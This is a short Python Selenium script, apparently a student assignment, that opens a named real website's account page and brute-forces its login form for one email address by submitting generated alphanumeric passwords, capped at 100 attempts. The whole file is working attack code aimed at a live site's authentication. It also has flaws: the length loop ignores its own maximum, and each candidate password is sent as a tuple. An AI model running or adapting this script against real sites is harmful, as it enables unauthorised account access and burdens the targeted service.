from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time
import itertools

def bruteForce():
    min = 4
    max = 20
    diccionario = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    value = []
    contador = 0

    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.infor-ingen.com")
    print(driver.title)

    driver.find_element_by_link_text('Mi cuenta').click()
    for tam in range (min, len(diccionario)):
        for password in itertools.product(diccionario, repeat=tam):
            if contador <= 99:
                print('intento: ', contador, 'clave:', password)
                driver.find_element_by_name('email').clear()
                driver.find_element_by_name('password').clear()
                driver.find_element_by_name('email').send_keys('tareacriptova@gmail.com')
                driver.find_element_by_name('password').send_keys(password)
                time.sleep(2)
                driver.find_element_by_css_selector("[value^='Inicio de sesión']").click()
            else:
                break
            contador += 1
bruteForce()
